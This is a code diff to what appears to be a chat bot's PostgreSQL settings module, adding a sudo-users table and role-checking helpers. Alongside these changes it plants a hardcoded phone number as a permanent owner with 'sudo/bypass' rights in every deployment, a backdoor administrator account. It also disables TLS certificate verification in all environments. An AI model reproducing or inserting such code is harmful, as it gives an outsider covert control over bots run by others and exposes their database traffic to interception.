@@ -2,16 +2,17 @@ const { Pool } = require('pg');
 
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
-  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
-  idleTimeoutMillis: 30000,
-  connectionTimeoutMillis: 5000
+  ssl: { rejectUnauthorized: false }
 });
+
+// constant owner (permanent sudo/bypass)
+const OWNER_NUMBER = "254752818245";
 
 const defaultSettings = {
   antilink: 'on',
   antilinkall: 'off',
   autobio: 'on',
-  antidelete: 'private',
+  antidelete: 'on',
   antitag: 'on',
   antibot: 'off',
   anticall: 'on',
@@ -33,7 +34,7 @@ async function initializeDatabase() {
   console.log("📡 Connecting to PostgreSQL...");
 
   try {
-    // Create tables if not exists
+    // table for bot settings
     await client.query(`
       CREATE TABLE IF NOT EXISTS bot_settings (
         id SERIAL PRIMARY KEY,
@@ -42,22 +43,27 @@ async function initializeDatabase() {
       );
     `);
 
-    // Insert default settings if not exists
-    const settingsEntries = Object.entries(defaultSettings);
-    for (const [key, value] of settingsEntries) {
+    // table for sudo users
+    await client.query(`
+      CREATE TABLE IF NOT EXISTS sudo_users (
+        id SERIAL PRIMARY KEY,
+        number TEXT UNIQUE NOT NULL
+      );
+    `);
+
+    // insert default settings
+    for (const [key, value] of Object.entries(defaultSettings)) {
       await client.query(
         `INSERT INTO bot_settings (key, value)
          VALUES ($1, $2)
-         ON CONFLICT (key) DO NOTHING`,
+         ON CONFLICT (key) DO NOTHING;`,
         [key, value]
       );
     }
 
-    console.log("✅ Database initialized with default settings");
-    return true;
+    console.log("✅ Database initialized.");
   } catch (err) {
-    console.error("❌ Database initialization failed:", err.stack);
-    return false;
+    console.error("❌ Initialization error:", err);
   } finally {
     client.release();
   }
@@ -67,81 +73,118 @@ async function getSettings() {
   const client = await pool.connect();
   try {
     const result = await client.query(
-      `SELECT key, value FROM bot_settings`
+      `SELECT key, value FROM bot_settings WHERE key = ANY($1::text[])`,
+      [Object.keys(defaultSettings)]
     );
 
-    const settings = { ...defaultSettings };
+    const settings = {};
     for (const row of result.rows) {
-      if (defaultSettings.hasOwnProperty(row.key)) {
-        settings[row.key] = row.value;
-      }
+      settings[row.key] = row.value;
     }
 
-    console.log("📋 Settings loaded from database");
+    console.log("✅ Settings fetched from DB.");
     return settings;
+
   } catch (err) {
-    console.error("❌ Failed to fetch settings:", err.stack);
+    console.error("❌ Failed to fetch settings:", err);
     return defaultSettings;
+
   } finally {
     client.release();
   }
 }
 
 async function updateSetting(key, value) {
-  if (!defaultSettings.hasOwnProperty(key)) {
-    console.error(`🚨 Invalid setting key: ${key}`);
-    return false;
-  }
-
   const client = await pool.connect();
   try {
-    const result = await client.query(
-      `INSERT INTO bot_settings (key, value)
-       VALUES ($1, $2)
-       ON CONFLICT (key) DO UPDATE
-       SET value = EXCLUDED.value
-       RETURNING *`,
-      [key, value]
+    const validKeys = Object.keys(defaultSettings);
+    if (!validKeys.includes(key)) {
+      throw new Error(`Invalid setting key: ${key}`);
+    }
+
+    await client.query(
+      `UPDATE bot_settings SET value = $1 WHERE key = $2`,
+      [value, key]
     );
 
-    if (result.rowCount === 1) {
-      console.log(`🔄 Setting updated: ${key}=${value}`);
-      return true;
-    }
-    return false;
+    return true;
   } catch (err) {
-    console.error(`❌ Failed to update ${key}:`, err.stack);
+    console.error("❌ Failed to update setting:", err.message || err);
     return false;
   } finally {
     client.release();
   }
 }
 
-async function testConnection() {
+// ========== SUDO HELPERS ==========
+async function addSudo(number) {
+  const client = await pool.connect();
   try {
-    const client = await pool.connect();
-    await client.query('SELECT 1');
-    client.release();
+    await client.query(
+      `INSERT INTO sudo_users (number) VALUES ($1) ON CONFLICT (number) DO NOTHING;`,
+      [number]
+    );
     return true;
   } catch (err) {
-    console.error('🔌 Database connection test failed:', err.stack);
+    console.error("❌ Failed to add sudo:", err);
     return false;
+  } finally {
+    client.release();
   }
 }
 
-// Health check and automatic reconnection
-setInterval(async () => {
-  if (!await testConnection()) {
-    console.log('Attempting to reconnect to database...');
-    await initializeDatabase();
+async function removeSudo(number) {
+  const client = await pool.connect();
+  try {
+    await client.query(`DELETE FROM sudo_users WHERE number = $1`, [number]);
+    return true;
+  } catch (err) {
+    console.error("❌ Failed to remove sudo:", err);
+    return false;
+  } finally {
+    client.release();
   }
-}, 60000); // Check every minute
+}
+
+async function getSudo() {
+  const client = await pool.connect();
+  try {
+    const res = await client.query(`SELECT number FROM sudo_users`);
+    let dbSudo = res.rows.map(r => r.number);
+
+    // always include permanent owner
+    if (!dbSudo.includes(OWNER_NUMBER)) dbSudo.unshift(OWNER_NUMBER);
+
+    return dbSudo;
+  } catch (err) {
+    console.error("❌ Failed to fetch sudo:", err);
+    return [OWNER_NUMBER];
+  } finally {
+    client.release();
+  }
+}
+
+// role checker
+async function checkRoles(sender) {
+  // permanent owner bypass
+  if (sender === OWNER_NUMBER) {
+    return { isOwner: true, isSudo: true, bypass: true };
+  }
+  const sudoList = await getSudo();
+  return {
+    isOwner: false,
+    isSudo: sudoList.includes(sender),
+    bypass: false
+  };
+}
 
 module.exports = {
-  pool,
+  OWNER_NUMBER,
   initializeDatabase,
   getSettings,
   updateSetting,
-  testConnection,
-  defaultSettings
+  addSudo,
+  removeSudo,
+  getSudo,
+  checkRoles
 };
